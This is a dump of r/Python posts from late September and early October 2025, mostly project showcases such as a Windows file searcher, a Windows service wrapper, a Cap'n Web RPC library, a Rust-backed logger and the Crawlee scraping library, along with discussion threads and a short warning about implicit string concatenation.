1nv928s,üîçRAISearcher v.1.0 - A Super-Fast Files & Folder searching tool for Windows,Necessary_Mind7337,0,4,2025-10-01 14:03:02,https://www.reddit.com/r/Python/comments/1nv928s/raisearcher_v10_a_superfast_files_folder/,"# üîçRAISearcher

**What My Project Does**

RAISearcher is a **Super-Fast and Reliable File & Folder Searcher Tool** for Windows, built in Python with CustomTkinter.

It‚Äôs designed to be **faster** than Windows Explorer search, **lightweight**, and **user-friendly**.

\---

# ‚ú® Features

* \- ‚ö° Super-fast **multithreaded scanning**
* \- üìÇ Search **inside drives** or **folders**
* \- üîé Search by **keywords** or **exact match**
* \- üéØ **Filter** by file extension (\`.png\`, \`.exe\`, \`.pdf\`, etc.)
* \- üìë **Copy** file/folder path to clipboard
* \- üñ•Ô∏è Modern **dark-themed GUI** (CustomTkinter)
* \- ‚õî **Stop** search anytime

\---

**Target Audience**

* Regular Windows users
* People who want fast search results
* People who constantly search for files

\---

**Comparison**

|Features|Windows Explorer Search|RAISearcher|
|:-|:-|:-|
|Extension Filtering|Difficult and Not user friendly|Very easy, User friendly and can be selected from a dropdown menu or can be typed manually|
|Exact match|Also, difficult and Not user friendly|Can be achieved by just checking a checkbox|
|Speed|\~10-20sec|\~1-2sec|
|Indexing|‚úÖ - Adds up and consumes memory. Not good for PCs with small memory|‚ùå- Built for slow & low memory PCs|
|Multi-threaded Searching|‚ùå|‚úÖ|

\---

# üì• Download

Visit the GitHub page to see more and download the latest release!

üëâ [Visit GitHub Page](https://github.com/RAI-Official/RAISearcher)

**Note:**

Couldn't upload images because it is not allowing me to upload. (Images & Videos tab is greyed out)  
Also tell me if the .exe doesn't work"
1nv72oz,Typing the test suite,fjarri,13,42,2025-10-01 12:39:24,https://www.reddit.com/r/Python/comments/1nv72oz/typing_the_test_suite/,"What is everyone's experience with adding type hints to the test suite? Do you do it (or are required to do it at work)? Do you think it is worth it?

I tried it with a couple of my own projects recently, and it did uncover some bugs, API inconsistencies, and obsolete tests that just happened to still work despite types not being right. But there were also a number of annoyances (which perhaps would not be as noticeable if I added typing as I wrote the tests and not all at once). Most notably, due to the unfortunate convention of `mypy`, I had to add `-> None` to all the test functions. There were also a number of cases where I used duck typing to make the tests visually simpler, which had to be amended to be more strict. Overall I'm leaning towards doing it in the future for new projects."
1nv696e,Just built a tool that turns any Python app into a native windows service,AdUnhappy5308,73,8,2025-10-01 12:01:07,https://www.reddit.com/r/Python/comments/1nv696e/just_built_a_tool_that_turns_any_python_app_into/,"What My Project Does

I built a tool called Servy that lets you run any Python app (or other executables) as a native Windows service. You just set the Python executable path, add your script and arguments (for example -u for unbuffered mode if you want stdout and stderr logging), choose the startup type, working directory, and environment variables, configure any optional parameters, click install ‚Äî and you‚Äôre done. Servy comes with a GUI, CLI, PowerShell integration, and a manager app for monitoring services in real time.

Target Audience

Servy is meant for developers or sysadmins who need to keep Python scripts running reliably in the background without having to rewrite them as Windows services. It works equally well for Node.js, .NET, or any executable, but I built it with Python apps in mind. It‚Äôs designed for production use on Windows 7 through Windows 11 as well as Windows Server.

Comparison

Compared to tools like sc or nssm, Servy adds important features that make managing services easier. It lets you set a custom working directory (avoiding the common C:\Windows\System32 issue that breaks relative paths), redirect stdout and stderr to rotating log files, and configure health checks with automatic recovery and restart policies. It also provides a clean, modern UI and real-time service management, making it more user-friendly and capable than existing options.

Repo: https://github.com/aelassas/servy

Demo video: https://www.youtube.com/watch?v=biHq17j4RbI

Any feedback is welcome."
1nv68ds,Seeking Free Python Certification Courses - Anyone Know Reputable Ones?,Great_Estimate_1564,0,10,2025-10-01 12:00:14,https://www.reddit.com/r/Python/comments/1nv68ds/seeking_free_python_certification_courses_anyone/,"Hey guys,Looking to skill up on Python and wondering if anyone's aware of free certification courses out there? üëÄ #python #Programming #coding "
1nv5lcw,py-capnweb - A Python implementation of Cap'n Web's RPC protocol,sfermigier,10,9,2025-10-01 11:27:20,https://www.reddit.com/r/Python/comments/1nv5lcw/pycapnweb_a_python_implementation_of_capn_webs/,"I've just released v0.3.0 of a project I've been working on called **py-capnweb**.

It's a Python implementation of the [Cap'n Web protocol](https://github.com/cloudflare/capnweb), a fascinating new RPC protocol announced a couple of weeks ago. My implementation is **fully interoperable** with the official TypeScript version, so you can have a Python backend talking to a TypeScript/JS frontend (and vice-versa) seamlessly.

# What The Project Does

`py-capnweb` is designed to eliminate the friction of client-server communication. It makes remote function calls feel just like local function calls. Instead of manually writing HTTP endpoints, serializing data, and dealing with network waterfalls, you can design your APIs like you would a normal JavaScript or Python library.

Two main features stand out: **capability-based security** and **promise pipelining**. This means you pass around secure object references instead of raw data, and you can chain multiple dependent calls into a single network round trip, which can be a huge performance win.

# Target Audience & Production Readiness

This project is for developers building interactive, cross-language applications (e.g., Python backend, JS/TS frontend) who are tired of the boilerplate and latency issues that come with traditional REST or even GraphQL APIs.

**Is it production-ready?** The protocol itself is new but built on the mature foundations of Cap'n Proto. My implementation is at `v0.3.0` and passes a comprehensive cross-implementation test suite. It's stable and ready for real-world use cases, especially for teams that want to be on the cutting edge of RPC technology.

# How is it Different from REST, gRPC, or GraphQL?

This is the most important question! Here‚Äôs a quick comparison:

* **vs. REST:** REST is resource-oriented, using a fixed set of verbs (GET, POST, etc.). Cap'n Web is object-oriented, allowing you to call methods on remote objects directly. This avoids the ""N+1"" problem and complex state management on the client, thanks to promise pipelining.
* **vs. gRPC:** gRPC is a high-performance RPC framework, but it's schema-based (using Protocol Buffers). Cap'n Web is schema-less, making it more flexible and feel more native to dynamic languages like Python and JavaScript, which means less boilerplate. While gRPC has streaming, Cap'n Web's promise pipelining and bidirectional nature provide a more expressive way to handle complex, stateful interactions.
* **vs. GraphQL:** GraphQL is excellent for querying complex data graphs in one go. However, it's a specialized query language and can be awkward for mutations or chained operations. Cap'n Web solves the same ""over-fetching"" problem as GraphQL but feels like writing regular code, not a query. You can intuitively chain calls (`user.getProfile()`, `profile.getFriends()`, etc.) in a single, efficient batch.

# Key Features of py-capnweb

* **100% TypeScript Interoperability**: Fully tested against the official `capnweb` library.
* **Promise Pipelining**: Batch dependent calls into a single network request to slash latency.
* **Capability-Based Security**: Pass around secure object references, not exposed data.
* **Bidirectional RPC**: It's peer-to-peer; the ""server"" can call the ""client"" just as easily.
* **Pluggable Transports**: Supports HTTP batch and WebSocket out-of-the-box. (More planned!)
* **Fully Async**: Built on Python's `asyncio`.
* **Type-Safe**: Complete type hints (tested with `pyrefly`/`mypy`).

# See it in Action

Here‚Äôs how simple it is to get started.

**(Server,** `server.py`\*\*)\*\*

    import asyncio
    from typing import Any
    from capnweb.server import Server, ServerConfig
    from capnweb.types import RpcTarget
    from capnweb.error import RpcError
    
    class Calculator(RpcTarget):
        async def call(self, method: str, args: list[Any]) -> Any:
            match method:
                case ""add"":
                    return args[0] + args[1]
                case ""subtract"":
                    return args[0] - args[1]
                case _:
                    raise RpcError.not_found(f""Method {method} not found"")
    
    async def main() -> None:
        config = ServerConfig(host=""127.0.0.1"", port=8080)
        server = Server(config)
        server.register_capability(0, Calculator()) # Register main capability
        await server.start()
        print(""Calculator server listening on http://127.0.0.1:8080/rpc/batch"")
        await asyncio.Event().wait()
    
    if __name__ == ""__main__"":
        asyncio.run(main())

**(Client,** `client.py`\*\*)\*\*

    import asyncio
    from capnweb.client import Client, ClientConfig
    
    async def main() -> None:
        config = ClientConfig(url=""http://localhost:8080/rpc/batch"")
        async with Client(config) as client:
            result = await client.call(0, ""add"", [5, 3])
            print(f""5 + 3 = {result}"")  # Output: 5 + 3 = 8
    
            result = await client.call(0, ""subtract"", [10, 4])
            print(f""10 - 4 = {result}"")  # Output: 10 - 4 = 6
    
    if __name__ == ""__main__"":
        asyncio.run(main())

# Check it out!

I'd love for you to take a look, try it out, and let me know what you think. I believe this paradigm can genuinely improve how we build robust, cross-language distributed systems.

* **GitHub Repo**: [https://github.com/abilian/py-capnweb](https://github.com/abilian/py-capnweb)
* **Installation**: `pip install capnweb` or `uv add capnweb`

The project is dual-licensed under MIT or Apache-2.0. All feedback, issues, and contributions are welcome!

**TL;DR:** I built a Python version of the new Cap'n Web RPC protocol that's 100% compatible with the official TypeScript version. It's built on `asyncio`, is schema-less, and uses promise pipelining to make distributed programming feel more like local development."
1nv3tgp,"Logly üöÄ ‚Äî a Rust-powered, super fast, and simple logging library for Python",muhammad-fiaz,247,131,2025-10-01 09:43:28,https://www.reddit.com/r/Python/comments/1nv3tgp/logly_a_rustpowered_super_fast_and_simple_logging/,"**What My Project Does**

i am building an Logly a  **logging library for Python** that combines simplicity with **high performance** using a Rust backend. It supports:

* Console and file logging
* JSON / structured logging
* Async background writing to reduce latency
* Pretty formatting with minimal boilerplate

It‚Äôs designed to be **lightweight, fast, and easy to use**, giving Python developers a modern logging solution without the complexity of the built-in `logging` module.

**Latency Microbenchmark (30,000 messages):**

|Percentile|`logging`Python|Logly|Speedup|
|:-|:-|:-|:-|
|p50|0.014 ms|0.002 ms|7√ó|
|p95|0.029 ms|0.002 ms|14.5√ó|
|p99|0.043 ms|0.015 ms|2.9√ó|

>

\> **Note:** Performance may vary depending on your OS, CPU, Python version, and system load. Benchmarks show **up to 10√ó faster performance** under high-volume or multi-threaded workloads, but actual results will differ based on your environment.

**Target Audience**

* Python developers needing high-performance logging
* Scripts, web apps, or production systems
* Developers who want structured logging or async log handling without overhead

**Logging Library Comparison**

|Feature / Library|`logging`Python|Loguru|Structlog|**Logly (v0.1.1)**|
|:-|:-|:-|:-|:-|
|**Backend**|Python|Python|Python|Rust|
|**Async Logging**|‚ùå|‚úÖ (basic)|‚úÖ|‚úÖ (high-performance, async background writer)|
|**File & Console Logging**|‚úÖ|‚úÖ|‚úÖ|‚úÖ|
|**JSON / Structured Logging**|‚úÖ (manual)|‚úÖ|‚úÖ|‚úÖ (built-in, easy)|
|**Ease of Use**|Medium|High|Medium|High (simple API, minimal boilerplate)|
|**Performance (single-threaded)**|Baseline|\~1.5‚Äì2√ó faster|\~1√ó|\~3.5√ó faster|
|**Performance (multi-threaded / concurrent)**|Baseline|\~2‚Äì3√ó|\~1√ó|**up to 10√ó faster** üöÄ|
|**Pretty Formatting / Color**|‚ùå / limited|‚úÖ|‚ùå|‚úÖ|
|**Rotation / Retention**|‚úÖ (config-heavy)|‚úÖ|Limited|‚úÖ|
|**Additional Notes**|Standard library, reliable, but verbose and slower|Easy setup, friendly API|Structured logging focus|Rust backend, optimized for high-volume, async, low-latency logging|

**Example Usage**

    from logly import logger
    
    logger.info(""Hello from Logly!"")
    logger.debug(""Logging asynchronously to a file"")
    logger.error(""Structured logging works too!"", extra={""user"": ""alice""})

**Links**

* GitHub (open source): [https://github.com/muhammad-fiaz/logly/](https://github.com/muhammad-fiaz/logly/)
* PyPI: [https://pypi.org/project/logly/](https://pypi.org/project/logly/)

**To Get Started:**

    pip install logly

Please feel free to **check it out, give feedback, and report any issues** on GitHub or PyPI. I‚Äôd really appreciate your thoughts and contributions! üôÇ

**Note: This Project is Not Vibe-Coded or AI Used i am Only Have Used AI for Documentation Purposes to Speed up Initial Development Only, the Code itself is Mine and Implemented by Mine (No AI Usage from the start itself) and also the performance of logly is not tested fully yet because this project is still in active development!**

**UPDATE!!! üöÄ** (03-10-2025) Thanks for all the feedback, everyone! Based on user requests, I‚Äôve improved **Logly v0.1.4** (Released now) and added some new features. I‚Äôve also updated the documentation for better clarity.

‚úÖ Currently, Logly supports **Linux, Windows, and macOS** for **Python 3.10 to 3.13**. üìñ Please report any issues or errors directly on **GitHub,** that‚Äôs the best place for bug reports and feature requests (not Reddit). For broader conversations, please use [**GitHub Discussions**](https://github.com/muhammad-fiaz/logly/discussions).

For those [asking for proof of my work](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nhdisrd/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button): I‚Äôve been actively coding and tracking my projects via [WakaTime](https://wakatime.com/@muhammadfiaz), and I have a good community supporting my work.

I understand some people may not like the project, and that‚Äôs fine, you‚Äôre free to have your opinion. But if you want to give constructive feedback, please do it openly on GitHub under your real account instead of throwaway or anonymous ones. That way, the feedback is more helpful and transparent.

BTW! I take **docstrings and documentation very seriously :) ,** I personally review every single one each time to ensure quality and clarity. If anything is missing or not updated for the latest release, you can always create an issue or a PR. I always welcome contributions.

Also, judging whether I used AI just based on [my *constant*¬†bullet points, bold text or docstrings ](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nh9h8ua/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button)in the Rust code? That‚Äôs really childish,  comments and docstrings alone aren‚Äôt proof of anything. I always make sure to add both to keep everything well-documented for contributors, and also saying ""[Rust Devs don't use comments and docstrings](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nhe8f9v/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button)"" but I‚Äôve seen plenty of experienced Rust developers use them as well, in Rust and across all programming languages.

Finally üôÇ I am not promoting or making statements about whether using AI is right or wrong, good practice or bad practice, it depends entirely on your use case and personal preference and up to you only.

If you still insist this is ‚Äúvibe coding,‚Äù then fine, that‚Äôs your opinion. If not, then it‚Äôs whatever, I don‚Äôt care. I am using my **real name** and being transparent. Just because I work on this project personally doesn‚Äôt mean it‚Äôs for a [job or resume](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nh7zjyc/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button); I‚Äôve clearly stated that in my profile. If you want to collaborate, feel free to do so for **improvements**, but commenting about [useless things](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nhdyz6a/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) or **misleading claims by** [puppeteer accounts](https://www.reddit.com/user/bay400/) doesn‚Äôt help anyone.

I wrote this message for people who are genuinely interested in creating new methods or contributing. [I am not promoting the project simply because it‚Äôs in Rust](https://www.reddit.com/r/Python/comments/1nv3tgp/comment/nhdyp23/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button),I wanted **feedback**, which is why I‚Äôm asking for input here for improvement, not for childish debates about whether I used AI or not.

At the end of the day, we‚Äôre all here to learn, whether you have 20+ years of experience in IT or you‚Äôre just a newbie. **Constructive discussion and improvements help everyone grow.**

And just to be clear I‚Äôm doing this to build awesome things in public and grow in public, so people can see the progress, learn, and contribute along the way :)

**Thanks again for all your support! üôèüôÇ**"
1nv01qm,"I built Poottu ‚Äî an offline, privacy-first password manager in Python",MrShortCircuitMan,0,6,2025-10-01 05:37:38,https://www.reddit.com/r/Python/comments/1nv01qm/i_built_poottu_an_offline_privacyfirst_password/,"Hey everyone ‚Äî I wanted to share a project I‚Äôve been working on recently: **Poottu**, a desktop password manager written in Python.

# What it does

At its core, Poottu is meant to be a **secure, offline, local vault** for credentials (usernames, passwords, URLs, notes).

* Fully **offline by default** ‚Äî no telemetry or automatic cloud sync built in
* Clean, minimal GUI (using **PySide6**)
* Groups/categories to organize entries
* Live search across title, username, URL, notes
* Entry preview pane with ‚Äúshow password‚Äù option
* Context menu actions: copy username, password, URL, old password, notes
* Timed clipboard clearing (after N seconds) to reduce exposure
* Encrypted backup / restore of vault
* Password generator built in
* Keyboard shortcuts support

# Target audience

Who is Poottu for?

* **Privacy-focused users** who do not want their credentials stored in cloud services by default
* People who prefer **local, device-only control** over their vault
* Those who want a **lightweight password manager** with no vendor lock-in

# Comparison

Most existing password managers fall into two camps: **command-line tools** like `pass` or `gopass`, and **cloud-based managers** like Bitwarden, 1Password, or LastPass.

CLI tools are lightweight and fully offline, but they often feel unintuitive for non-technical users. Cloud-based solutions, on the other hand, are polished and offer seamless cross-device sync, but they usually come with privacy trade-offs, vendor lock-in, or a subscription cost.

**Poottu tries to strike a balance between the two** ‚Äî it‚Äôs completely offline and open-source like CLI tools, but it also provides a clean, beginner-friendly desktop GUI that makes managing entries much easier.

The trade-off is that Poottu doesn‚Äôt ship with built-in sync. In short: Poottu aims to sit between a low-level CLI vault like `pass` and full-featured cloud managers ‚Äî offering **local safety plus a friendly UI**.

# Availability

* GitHub: [github.com/manikandancode/poottu](https://github.com/manikandancode/poottu)
* PyPI: [pypi.org/project/poottu](https://pypi.org/project/poottu/)

# License

MIT License

# Installation

You can install from PyPI:

    pip install poottu

Then run:

    poottu

I beautified and commented the code using AI to improve readability and inline documentation. If you try it out ‚Äî I‚Äôd love feedback, issues, or ideas for improvements and security. Thanks for checking it out. Hope it‚Äôs useful to someone here! üôè"
1nuw799,Watch out for your commas!!!,Flaky_Arugula9146,0,15,2025-10-01 02:14:28,https://www.reddit.com/r/Python/comments/1nuw799/watch_out_for_your_commas/,"You might already know the memes behind forgetting to end a line with a semi-colon `(;)`.

And it's kind of funny how Python doesn't fall into this problem.

You should, however, watch out for not ending a line with a comma in this particular scenario.

This scenario being having a list that extends multiple lines vertically.

```python
EXAMPLE_CONST_LIST = [
    ""main.py"",     #  <------ Make sure there is a trailing comma
    ""__pycache__""
]
```

> Python does not throw an error and errors silently

## What Happened to me?
I recently had this issue where I forgot to end an element with a comma. My program wasn't following the logical rules that I wanted it to follow. And this was a simple script, a little script. Nothing fancy, not a **HUGE** project. Just one file with a few lines:

```python
import os

EXCEPTIONS = [
    ""main.py""  # missing a comma here
    ""__pycache__""
]

for file in os.listdir():
    if file in EXCEPTIONS:
        continue
    
    # Rest of logic that I wanted
```

Notice the missing comma, I couldn't deduce the problem for 3 minutes straight. No errors thrown, just errored silently and executed some unwanted logic.

If you might not know, without adding a comma, the constant variable `EXCEPTIONS` from the previous snippet turns into:

```text
[""main.py__pycache__""]
```

Essentially, concatenates the underlying elements. Not sure why Python decided this was a good idea but if you find yourself defining an array vertically, let this serve as a reminder to make sure to end each element with comma."
1nuo0vb,New Online IDE - no logjn,Interesting_Agent_35,0,3,2025-09-30 20:19:07,https://www.reddit.com/r/Python/comments/1nuo0vb/new_online_ide_no_logjn/,"I found this thepythonconsole.com and since my vs code and all ides didn‚Äôt want to work I looked for an online one and this was so simple and free to use it‚Äôs insane. Just recommending it for yall if you ever need even to use python on your phone to showcase something quick. It even supports plots!!! 

thepythonconsole.com
"
1nukocw,"I got tired of manually searching for dev jobs, so I started building OrionJobs AI!",Ancient-Courage-6130,0,2,2025-09-30 18:13:20,https://www.reddit.com/r/Python/comments/1nukocw/i_got_tired_of_manually_searching_for_dev_jobs_so/,"Hey everyone,

I'm developing an open-source tool to automate the job search and would love to get your feedback on it. As required by the 'Showcase' flair rules, here's the breakdown:

What My Project Does
OrionJobs AI is a platform that automates the collection of job opportunities for developers. It integrates with multiple job board APIs (like RemoteOK and Adzuna) to aggregate, process, and store job listings in a central database. The long-term vision is to use AI to provide personalized job recommendations based on a user's skills and profile.

Target Audience
Primarily, it's for junior to mid-level developers who are actively job hunting and tired of the repetitive, manual process of checking multiple websites every day. It's built for developers who appreciate automation and want a more intelligent way to find their next opportunity.

Comparison
Compared to manually browsing LinkedIn or other job boards, OrionJobs AI saves significant time by centralizing opportunities. Unlike a simple RSS feed, it structures and normalizes the data. The key differentiator in the future will be its AI-powered recommendation engine, which aims to provide more relevant matches than the generic algorithms used by larger platforms.

Current Status:
The backend is 100% ""cloud-ready,"" built with Python, FastAPI, PostgreSQL, and fully containerized with Docker. The data collection system is operational. The full roadmap is in the README.

I'd love to get your feedback on the code, the architecture, or the general idea. The project is completely open to contributions (I've already tagged some good first issues for anyone looking to get started).

GitHub Repo: https://github.com/GuiDev-01/orion-jobs-ai

Thanks for the support!"
1nuk8hi,Running rust code in python,Cold-Supermarket-715,0,6,2025-09-30 17:57:02,https://www.reddit.com/r/Python/comments/1nuk8hi/running_rust_code_in_python/,"If I compile rust as .whl files using tools Like maturin, and import it in python will this piece of code/method run at rust equivalent speed or python speed ?

Also other things will be impacted like garbage collection and memory management?

I have an api causing db cpu spike in django which is intensive and I'm trying to write a small rust service which can just run this part and make use of rust advantages.

My motivation is outlined in this blog post 

https://wxiaoyun.com/blog/rust-rewrite-case-study/"
1nuc9fy,"I made: Dungeon Brawl ‚öîÔ∏è ‚Äì Text-based Python battle game with attacks, specials, and healing",leenzy-leen,25,7,2025-09-30 12:47:37,https://www.reddit.com/r/Python/comments/1nuc9fy/i_made_dungeon_brawl_textbased_python_battle_game/,"**What My Project Does:**  
Dungeon Brawl is a **text-based, turn-based battle game** in Python. Players fight monsters using normal attacks, special moves, and healing potions. The game uses **classes, methods, and the random module** to handle combat mechanics and damage variability.

**Target Audience:**  
It‚Äôs a **toy/learning project** for Python beginners or hobbyists who want to see OOP, game logic, and input/output in action. Perfect for someone who wants a small but playable Python project.

**Comparison:**  
Unlike most beginner Python games that are static or single-turn, Dungeon Brawl is **turn-based with limited special attacks, healing, and randomized combat**, making it more interactive and replayable than simple text games.

Check it out here: [https://github.com/itsleenzy/dungeon-brawl/](https://github.com/itsleenzy/dungeon-brawl/)"
1nuaqe8,"Stories from running a workflow engine, e.g., Hatchet, in Production",gthank,106,14,2025-09-30 11:34:07,https://www.reddit.com/r/Python/comments/1nuaqe8/stories_from_running_a_workflow_engine_eg_hatchet/,"Hi everybody! I find myself in need of a workflow engine (I'm DevOps, so I'll be using it and administering it), and it seems the Python space is exploding with options right now. I'm passingly familiar with Celery+Canvas and DAG-based tools such as Airflow, but the hot new thing seems to be Durable Execution frameworks like Temporal.io, DBOS, Hatchet, etc. I'd love to hear stories from people actually using and managing such things in the wild, as part of evaluating which option is best for me.

Just from reading over these projects docs, I can give my initial impressions:

* Temporal.io - enterprise-ready, lots of operational bits and bobs to manage, seems to want to take over your entire project
* DBOS - way less operational impact, but also no obvious way to horizontally scale workers independent of app servers (which is sort of a key feature for me)
* Hatchet - evolving fast, Durable Execution/Workflow bits seem fairly recent, no obvious way to logically segment queues, etc. by tenant (Temporal has Namespaces, Celery+Canvas has Virtual Hosts in RabbitMQ, DBOS‚Ä¶ might be leveraging your app database, so it inherits whatever you are doing there?)

Am I missing any of the big (Python) players? What has your experience been like?"
1nu9n4l,"Telelog: A high-performance diagnostic & visualization tool for Python, powered by Rust",Vedant-03,21,21,2025-09-30 10:33:15,https://www.reddit.com/r/Python/comments/1nu9n4l/telelog_a_highperformance_diagnostic/,"**GitHub Link:** [https://github.com/vedant-asati03/telelog](https://github.com/vedant-asati03/telelog)

# What My Project Does

Telelog is a diagnostic framework for Python with a Rust core. It helps you understand *how* your code runs, not just *what* it outputs.

* **Visualizes Code Flow:** Automatically generates flowcharts and timelines from your code's execution.
* **High-Performance:** 5-8x faster than the built-in `logging` module.
* **Built-in Profiling:** Find bottlenecks easily with `with logger.profile():`.
* **Smart Context:** Adds persistent context (`user_id`, `request_id`) to all events.

# Target Audience

* Developers debugging complex systems (e.g., data pipelines, state machines).
* Engineers building performance-sensitive applications.
* Anyone who wants to visually understand and document their code's logic.

# Comparison (vs. built-in logging)

* **Scope:** `logging` is for text records. Telelog is an **instrumentation framework** with profiling & visualization.
* **Visualization:** Telelog's automatic diagram generation is a unique feature.
* **Performance:** Telelog's Rust core offers a significant speed advantage."
1nu8tt6,Crawlee for Python v1.0 is LIVE!,B4nan,74,25,2025-09-30 09:42:48,https://www.reddit.com/r/Python/comments/1nu8tt6/crawlee_for_python_v10_is_live/,"Hi everyone, our team just launched¬†[**Crawlee for Python üêç**](https://github.com/apify/crawlee-python/)¬†**v1.0**, an open source web scraping and automation library. We launched the beta version in Aug 2024¬†[here](https://www.reddit.com/r/Python/comments/1dyyaky/crawlee_for_python_is_live/), and got a lot of feedback. With new features like Adaptive crawler, unified storage client system, Impit HTTP client, and a lot of new things, the library is ready for its public launch.

**What My Project Does**

It's an open-source web scraping and automation library, which provides a unified interface for HTTP and browser-based scraping, using popular libraries like¬†[beautifulsoup4](https://pypi.org/project/beautifulsoup4/)¬†and¬†[Playwright](https://playwright.dev/python/)¬†under the hood.

**Target Audience**

The target audience is developers who wants to try a scalable crawling and automation library which offers a suite of features that makes life easier than others. We launched the beta version a year ago, got a lot of feedback, worked on it with help of early adopters and launched Crawlee for Python v1.0.

**New features**

* **Unified storage client system**: less duplication, better extensibility, and a cleaner developer experience. It also opens the door for the community to build and share their own storage client implementations.
* **Adaptive Playwright crawler**: makes your crawls faster and cheaper, while still allowing you to reliably handle complex, dynamic websites. In practice, you get the best of both worlds: speed on simple pages and robustness on modern, JavaScript-heavy sites.
* **New default HTTP client** (ImpitHttpClient, powered by the¬†[Impit](https://github.com/apify/impit)¬†library): fewer false positives, more resilient crawls, and less need for complicated workarounds. Impit is also developed as an open-source project by Apify, so you can dive into the internals or contribute improvements yourself: you can also create your own instance, configure it to your needs (e.g. enable HTTP/3 or choose a specific browser profile), and pass it into your crawler.
* **Sitemap request loader**: easier to start large-scale crawls where sitemaps already provide full coverage of the site
* **Robots exclusion standard**: not only helps you build ethical crawlers, but can also save time and bandwidth by skipping disallowed or irrelevant pages
* **Fingerprinting**: each crawler run looks like a real browser on a real device. Using fingerprinting in Crawlee is straightforward: create a fingerprint generator with your desired options and pass it to the crawler.
* **Open telemetry**: monitor real-time dashboards or analyze traces to understand crawler performance. easier to integrate Crawlee into existing monitoring pipelines

**Find out more**

Our team will be here in r/Python for an **AMA** on **Wednesday 8th October 2025, at 9am EST/2pm GMT/3pm CET/6:30pm IST**. We will be answering questions about webscraping, Python tooling, moving products out of beta, testing, versioning, and much more!

Check out our GitHub repo and blog for more info!

**Links**

GitHub:¬†[https://github.com/apify/crawlee-python/](https://github.com/apify/crawlee-python/)  
Discord:¬†[https://apify.com/discord](https://apify.com/discord)  
Crawlee website:¬†[https://crawlee.dev/python/](https://crawlee.dev/python/)  
Blogpost: [https://crawlee.dev/blog/crawlee-for-python-v1](https://crawlee.dev/blog/crawlee-for-python-v1)"
1nu22gk,Anthropic: Claude Sonnet 4.5 is the best coding model in the world.,AssociationNo6504,0,1,2025-09-30 02:59:30,https://www.reddit.com/r/Python/comments/1nu22gk/anthropic_claude_sonnet_45_is_the_best_coding/,"Claude Sonnet 4.5 is now being packaged as the new default model for general use on Anthropic's platforms, replacing Sonnet 4 in most product experiences. It's broadly available for all users‚Äîincluding through the [Claude.ai](http://Claude.ai) website, mobile apps, and API‚Äîwithout the access restrictions and premium pricing of the Opus models.

Additionally, Sonnet 4.5 is said to be better than Opus at coding. 

>Claude Sonnet 4.5 is the best coding model in the world. [https://www.anthropic.com/news/claude-sonnet-4-5](https://www.anthropic.com/news/claude-sonnet-4-5)"
1nu118l,sparkenforce: Type Annotations & Runtime Schema Validation for PySpark DataFrames,nopasanaranja20,8,2,2025-09-30 02:09:47,https://www.reddit.com/r/Python/comments/1nu118l/sparkenforce_type_annotations_runtime_schema/,"sparkenforce is a PySpark type annotation package that lets you specify and enforce DataFrame schemas using Python type hints.

## What My Project Does

Working with PySpark DataFrames can be frustrating when schemas don‚Äôt match what you expect, especially when they lead to runtime errors downstream.

sparkenforce solves this by:

* Adding type annotations for DataFrames (columns + types) using Python type hints.
* Providing a `@validate` decorator to enforce schemas at runtime for function arguments and return values.
* Offering clear error messages when mismatches occur (missing/extra columns, wrong types, etc.).
* Supporting flexible schemas with ..., optional columns, and even custom Python ‚Üî Spark type mappings.

Example:

```
from sparkenforce import validate
from pyspark.sql import DataFrame, functions as fn

@validate
def add_length(df: DataFrame[""firstname"": str]) -> DataFrame[""name"": str, ""length"": int]:
    return df.select(
        df.firstname.alias(""name""),
        fn.length(""firstname"").alias(""length"")
    )
```

If the input DataFrame doesn‚Äôt contain ""firstname"", you‚Äôll get a `DataFrameValidationError` immediately.

## Target Audience

* PySpark developers who want stronger contracts between DataFrame transformations.
* Data engineers maintaining ETL pipelines, where schema changes often breaks stuff.
* Teams that want to make their PySpark code more self-documenting and easier to understand.

## Comparison

* Inspired by [dataenforce](https://github.com/CedricFR/dataenforce) (Pandas-oriented), but extended for PySpark DataFrames.
* Unlike static type checkers (e.g. mypy), sparkenforce enforces schemas at runtime, catching real mismatches in Spark pipelines.
* [spark-expectations](https://github.com/Nike-Inc/spark-expectations) has a wider aproach, tackling various data quality rules (validating the data itself, adding observability, etc.). sparkenforce focuses only on schema or structure data contracts.

## Links

* PyPI: [sparkenforce](https://pypi.org/project/sparkenforce/)
* Source code: [GitHub repo](https://github.com/agustin-recoba/sparkenforce)
* Demo notebook: [Examples](https://github.com/agustin-recoba/sparkenforce/blob/main/src/demo/demo_notebook.ipynb)"
1nu0gdd,Pandas 2.3.3 released with Python 3.14 support,Balance-,84,18,2025-09-30 01:43:01,https://www.reddit.com/r/Python/comments/1nu0gdd/pandas_233_released_with_python_314_support/,"Pandas was the last major package in the Python data analysis ecosystem that needed to be updated for Python 3.14.

https://github.com/pandas-dev/pandas/releases/tag/v2.3.3"
1nty93i,Tuesday Daily Thread: Advanced questions,AutoModerator,6,0,2025-09-30 00:00:31,https://www.reddit.com/r/Python/comments/1nty93i/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
